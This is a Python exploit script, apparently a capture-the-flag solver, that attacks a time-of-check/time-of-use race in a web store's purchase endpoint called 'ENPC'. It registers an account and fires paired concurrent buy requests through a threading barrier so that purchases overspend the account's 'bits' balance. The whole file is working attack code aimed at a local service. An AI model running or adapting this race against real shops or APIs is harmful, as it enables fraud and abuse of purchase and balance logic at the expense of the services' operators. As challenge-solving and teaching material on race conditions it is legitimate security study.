#!/usr/bin/env python3
from __future__ import annotations

import argparse
import secrets
import string
import threading
from dataclasses import dataclass

import requests


DEFAULT_BASE_URL = "http://127.0.0.1:3000"


@dataclass
class ClientState:
    base_url: str
    token: str

    @property
    def headers(self) -> dict[str, str]:
        return {"Authorization": f"Bearer {self.token}"}


def random_username() -> str:
    suffix = "".join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(10))
    return f"solver_{suffix}"


def register_or_login(base_url: str, username: str | None, password: str) -> ClientState:
    chosen_username = username or random_username()
    register_res = requests.post(
        f"{base_url}/api/auth/register",
        json={"username": chosen_username, "password": password},
        timeout=10,
    )

    if register_res.status_code not in (201, 409):
        raise SystemExit(f"register failed: {register_res.status_code} {register_res.text}")

    if register_res.status_code == 201:
        token = register_res.json()["token"]
        print(f"[+] registered {chosen_username}")
        return ClientState(base_url, token)

    login_res = requests.post(
        f"{base_url}/api/auth/login",
        json={"username": chosen_username, "password": password},
        timeout=10,
    )
    if login_res.status_code != 200:
        raise SystemExit(f"login failed: {login_res.status_code} {login_res.text}")

    print(f"[+] logged in as existing user {chosen_username}")
    return ClientState(base_url, login_res.json()["token"])


def fetch_me(client: ClientState) -> dict:
    res = requests.get(f"{client.base_url}/api/me", headers=client.headers, timeout=10)
    if res.status_code != 200:
        raise SystemExit(f"/api/me failed: {res.status_code} {res.text}")
    return res.json()


def buy(client: ClientState, item_id: str) -> tuple[int, dict]:
    res = requests.post(
        f"{client.base_url}/api/store/buy",
        headers=client.headers,
        json={"item_id": item_id},
        timeout=15,
    )
    try:
        body = res.json()
    except Exception:
        body = {"raw": res.text}
    return res.status_code, body


def race_pair(client: ClientState) -> tuple[tuple[int, dict], tuple[int, dict]]:
    results: dict[str, tuple[int, dict]] = {}
    barrier = threading.Barrier(2)

    def worker(item_id: str) -> None:
        barrier.wait()
        results[item_id] = buy(client, item_id)

    threads = [
        threading.Thread(target=worker, args=("apple",)),
        threading.Thread(target=worker, args=("drink",)),
    ]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()
    return results["apple"], results["drink"]


def exhaust_bits(client: ClientState) -> None:
    round_index = 0
    bits = fetch_me(client)["bits"]
    while True:
        if bits < 6:
            break

        round_index += 1
        apple_res, drink_res = race_pair(client)
        refreshed = fetch_me(client)
        new_bits = refreshed["bits"]
        print(
            f"[+] race round {round_index}: bits {bits} -> {new_bits} "
            f"apple={apple_res} drink={drink_res}"
        )

        if new_bits >= bits:
            raise SystemExit("race made no progress; stopping")
        bits = new_bits

    while True:
        me = fetch_me(client)
        bits = me["bits"]
        if bits >= 2:
            res = buy(client, "carrot")
            print(f"[+] filler carrot: {res}")
        else:
            break


def main() -> None:
    parser = argparse.ArgumentParser(description="Exploit the ENPC store TOCTOU race")
    parser.add_argument("--base-url", default=DEFAULT_BASE_URL)
    parser.add_argument("--username")
    parser.add_argument("--password", default="enpcpass123")
    args = parser.parse_args()

    client = register_or_login(args.base_url.rstrip("/"), args.username, args.password)

    me = fetch_me(client)
    print(f"[+] starting state: bits={me['bits']} score={me['score']} inventory={me['inventory']}")

    exhaust_bits(client)

    me = fetch_me(client)
    print(f"[+] final state: bits={me['bits']} score={me['score']} rank={me['rank']}")
    print(f"[+] final inventory: {me['inventory']}")


if __name__ == "__main__":
    main()
